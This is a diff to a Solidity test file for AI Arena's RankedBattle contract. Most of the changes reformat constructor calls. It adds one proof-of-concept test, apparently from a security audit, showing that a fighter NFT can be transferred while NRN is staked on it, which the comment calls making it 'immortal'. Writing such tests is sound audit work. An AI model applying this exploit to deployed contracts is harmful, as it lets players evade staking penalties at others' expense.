@@ -55,7 +55,9 @@ contract RankedBattleTest is Test {
         _neuronContributorAddress = vm.addr(2);
         getProb();
 
-        _fighterFarmContract = new FighterFarm(_ownerAddress, _DELEGATED_ADDRESS, _treasuryAddress);
+        _fighterFarmContract = new FighterFarm(
+          _ownerAddress, _DELEGATED_ADDRESS, _treasuryAddress
+          );
 
         _helperContract = new AiArenaHelper(_probabilities);
 
@@ -65,16 +67,22 @@ contract RankedBattleTest is Test {
 
         _gameItemsContract = new GameItems(_ownerAddress, _treasuryAddress);
 
-        _voltageManagerContract = new VoltageManager(_ownerAddress, address(_gameItemsContract));
+        _voltageManagerContract = new VoltageManager(
+          _ownerAddress, address(_gameItemsContract)
+        );
 
-        _neuronContract = new Neuron(_ownerAddress, _treasuryAddress, _neuronContributorAddress);
+        _neuronContract = new Neuron(
+          _ownerAddress, _treasuryAddress, _neuronContributorAddress)
+          ;
 
         _rankedBattleContract = new RankedBattle(
-            _ownerAddress, _GAME_SERVER_ADDRESS, address(_fighterFarmContract), address(_voltageManagerContract)
+            _ownerAddress, _GAME_SERVER_ADDRESS, address(_fighterFarmContract),
+            address(_voltageManagerContract)
         );
 
         _mergingPoolContract =
-            new MergingPool(_ownerAddress, address(_rankedBattleContract), address(_fighterFarmContract));
+            new MergingPool(_ownerAddress, address(_rankedBattleContract),
+            address(_fighterFarmContract));
 
         _stakeAtRiskContract =
             new StakeAtRisk(_treasuryAddress, address(_neuronContract), address(_rankedBattleContract));
@@ -463,6 +471,22 @@ contract RankedBattleTest is Test {
         assertEq(wins, 1);
         uint256 unclaimedNRN = _rankedBattleContract.getUnclaimedNRN(player);
         assertEq(unclaimedNRN, 5000 * 10 ** 18);
+    }
+
+     /// @notice An exploit demonstrating that it's possible to transfer a staked fighter, and make it immortal!
+    function testExploitTransferStakedFighterAndPlay() public {
+        address player = vm.addr(3);
+        address otherPlayer = vm.addr(4);
+        _mintFromMergingPool(player);
+        uint8 tokenId = 0;
+        _fundUserWith4kNeuronByTreasury(player);
+        vm.prank(player);
+        _rankedBattleContract.stakeNRN(1 * 10 ** 18, tokenId);
+
+        // The player transfers the fighter to other player
+        vm.prank(address(player));
+        _fighterFarmContract.safeTransferFrom(player, otherPlayer, tokenId, "");
+       assertEq(_fighterFarmContract.ownerOf(tokenId), otherPlayer);
     }
 
     /*//////////////////////////////////////////////////////////////
